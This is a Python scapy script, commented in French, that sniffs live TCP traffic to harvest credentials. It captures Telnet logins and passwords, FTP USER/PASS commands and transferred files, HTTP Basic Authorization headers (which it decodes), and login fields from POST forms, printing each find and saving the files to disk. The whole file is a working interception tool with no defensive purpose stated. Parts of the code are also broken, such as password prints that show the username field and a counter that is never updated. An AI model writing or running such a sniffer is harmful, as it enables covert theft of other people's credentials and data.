from scapy.all import *
from collections import Counter
import base64

packet_counts = Counter()

# ----- Telnet
telnet_co = []
co_found = []
template = {'IPSERV':'','IPCLIENT':'','PRTSERV':0,'PRTCLIENT':0,'IDX_LOGIN':999999999999,'IDX_PASS':999999999999,'LOGIN':'','PASSWORD':'','END':False}

#------ FTP avec fichier
file = []
data_cache = []
historique_file = []
nb_file_found = 0
user = []
mdp = []

#------ HTML
http_conection = []

#------ Telnet ------
def prt_co_found(co):
    if co != []:
        for element in co:
            print("--------------------------")
            print("Connextion TELNET trouvé")
            print(f"Server: {element[0]}")
            print(f"Client: {element[1]}")
            print(f"User: {element[2]}")
            print(f"MDP: {element[3]}")


def ip_to_idx(ip,conec):
    for element in conec:
        if element['IPSERV'] == ip:
            return conec.index(element)
    return 0

def telnet(trames,idx_trame,connec):
    global template
    alpha ="abcdefghijklmnopqrstuvwxyz~!@#$%^&*_-+=`|()}{[]:;'<>,.?/1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    for frame in trames:
        if connec == []:
            if frame.haslayer('TCP'):
                if frame[2].sport == 23:
                    if frame.haslayer('Raw'):
                        data = frame[Raw].load
                        if "login:" in str(data):
                            if "Last login" in str(data):
                                pass
                            else:
                                telnet_co.append(template)
                                telnet_co[len(telnet_co)-1]['IDX_LOGIN'] = idx_trame+1
                                telnet_co[len(telnet_co)-1]['IPSERV'] = frame[1].src
                                telnet_co[len(telnet_co)-1]['IPCLIENT'] = frame[1].dst
                                telnet_co[len(telnet_co)-1]['PRTSERV'] = frame[2].sport
                                telnet_co[len(telnet_co)-1]['PRTCLIENT'] = frame[2].dport
                                template = {'IPSERV':'','IPCLIENT':'','PRTSERV':0,'PRTCLIENT':0,'IDX_LOGIN':999999999999,'IDX_PASS':999999999999,'LOGIN':'','PASSWORD':'','END':False}

        else:
            if frame.haslayer('TCP'):
                test_index = ip_to_idx(frame[1].src,telnet_co)
                if frame[1].src == telnet_co[test_index]['IPCLIENT']:
                    if frame[2].sport == telnet_co[test_index]['PRTCLIENT']:
                        if idx_trame+1 >= telnet_co[test_index]['IDX_LOGIN'] and telnet_co[test_index]['IDX_LOGIN'] != -1:
                            if frame.haslayer('Raw'):
                                data = frame[Raw].load
                                if b'\x00' in data:
                                    telnet_co[test_index]['IDX_LOGIN'] = -1
                                else: 
                                    if str(data)[2:-1] in alpha:
                                        telnet_co[test_index]['LOGIN'] += str(data)[2:-1]

                        elif idx_trame+1 >= telnet_co[test_index]['IDX_PASS'] and telnet_co[test_index]['IDX_PASS'] != -1:
                            if frame.haslayer('Raw'):
                                data = frame[Raw].load
                                if b'\x00' in data:
                                    telnet_co[test_index]['IDX_PASS'] = -1
                                    telnet_co[test_index]['END'] = True
                                else: 
                                    if str(data)[2:-1] in alpha:
                                        telnet_co[test_index]['PASSWORD'] += str(data)[2:-1]

                                        
                        

                elif frame[2].dport == telnet_co[test_index]['PRTCLIENT']:
                    if frame.haslayer('Raw'):
                        data = frame[Raw].load
                        if "Password" in str(data):
                            telnet_co[test_index]['IDX_PASS'] = idx_trame+1
        
                else:
                    if telnet_co[test_index]['END']:
                        co_found.append([telnet_co[test_index]['IPSERV'],telnet_co[test_index]['IPCLIENT'],telnet_co[test_index]['LOGIN'],telnet_co[test_index]['PASSWORD']])
                        telnet_co.pop(test_index)
                        prt_co_found(co_found)

#------ FTP ------
def ftp(frame,idx):
    global data_cache, nb_file_found
    F = frame['TCP'].flags

    if frame.haslayer('Raw'):   #Si le paquet contient des données
        data = frame[Raw].load
        if "RETR" in str(data): #Server --> Client transfert 
            file.append([str(data)[7:-5],idx,frame[1].src])
            historique_file.append(str(data)[7:-5])
            nb_file_found += 1
            print("--------------------------------------------")
            print(f"{idx}: ! Transfert trouver | Server --> Client")
            print(f"Client: {frame[1].src}:{frame[2].sport}")
            print(f"Server: {frame[1].dst}:{frame[2].dport}")

        if "STOR" in str(data): #Client --> Server transfert 
            file.append([str(data)[7:-5],idx,frame[1].src])
            historique_file.append(str(data)[7:-5])
            nb_file_found += 1
            print("----------------------------------------")
            print(f"{idx}: Transfert trouver | Client --> Server")
            print(f"Client: {frame[1].src}:{frame[2].sport}")
            print(f"Server: {frame[1].dst}:{frame[2].dport}")

        if "USER" in str(data):
            if [frame[1].dst,str(data)[7:-5]] not in user:
                user.append([frame[1].dst,str(data)[7:-5]])
                print("----------------------------------------")
                print(f"Utilisateur trouvé: {str(data)[7:-5]}")
                print(f"Server: {frame[1].dst}:{frame[2].dport}")

        if "PASS" in str(data):
            if [frame[1].dst,str(data)[7:-5]] not in mdp:
                mdp.append([frame[1].dst,str(data)[7:-5]])
                print("----------------------------------------")
                print(f"Mot de passe trouvé: {str(data)[7:-5]}")
                print(f"Server: {frame[1].dst}:{frame[2].dport}")
            
        if len(file) != 0:
            if len(file[len(file)-1]) != 3:
                if frame[2].sport == file[len(file)-1][4] or frame[2].dport == file[len(file)-1][4]:
                    data = frame[Raw].load
                    data_cache.append(data)
    
    try:
        if (idx-1 == file[len(file)-1][1]) and ((frame[1].src == file[len(file)-1][2]) or (frame[1].dst == file[len(file)-1][2])):
            if F == 'S':
                file[len(file)-1].append(frame[2].sport)
                file[len(file)-1].append(frame[2].dport)
    except:
        pass

    try:
        if str(F)[0] == 'F' and ( frame[2].sport == file[len(file)-1][4] or frame[2].dport == file[len(file)-1][4]):
            if file != []:
                file[len(file)-1][0] = open(f"file/{nb_file_found}-{file[len(file)-1][0]}", "wb")
                go_file_go(data_cache,file[len(file)-1][0])
                file[len(file)-1][0].close()
                data_cache = []
                file.pop(0)
                print("----------------------------------------")
                print("OK: Fichier récupéré")
                print(f"Nombre de fichier trouvé: {nb_file_found}")
                print(f"Fichier enregistré: {historique_file}")
    except:
        pass

    

def go_file_go(data_cache,name):
    "file/",nb_file_found,"-",name.writelines(data_cache)

#------ HTML ------
def html(frame):
    if frame.haslayer('Raw'):
        if frame[2].dport in [80,443]:
            data = str(frame[Raw].load)
            if "Authorization: Basic" in data:
                new = data.split("\\r")
                current = []
                for element in new:
                    if "Host: " in element:
                        current.append(element[8:])
                    if "Authorization" in element:
                        current.append(frame[1].src)
                        current.append(frame[1].dst)
                        userpass = base64.b64decode(element[23:]).decode('utf-8').split(":")
                        current.append(userpass[0])
                        current.append(userpass[1])

                if current not in http_conection:
                    http_conection.append(current)
                    print("----------------------------------------")
                    print("Connexion HTML")
                    print(f"Site: {current[0]} / IP(serv): {current[2]} / IP(client): {current[1]}")
                    print(f"User: {current[3]}")
                    print(f"Password: {current[3]}")

            if "POST" in data:
                new = data.split("\\r")
                current = []
                for element in new:
                    if "Referer: " in element:
                        current.append(element[11:])
                    if "username" in element:
                        current.append(frame[1].src)
                        current.append(frame[1].dst)
                        logform = element.split("&")
                        current.append(logform[1][9:])
                        current.append(logform[0][11:])

                if current not in http_conection:
                    http_conection.append(current)
                    print("----------------------------------------")
                    print("Connexion HTML.")
                    print(f"Site: {current[0]} / IP(serv): {current[2]} / IP(client): {current[1]}")
                    print(f"User: {current[3]}")
                    print(f"Password: {current[3]}")

#------ Main ------

def show_info(trame):
    telnet(trame,sum(packet_counts.values()),telnet_co)
    ftp(trame,sum(packet_counts.values()))
    html(trame)
    

sniff(filter="tcp",prn=show_info,iface=conf.iface)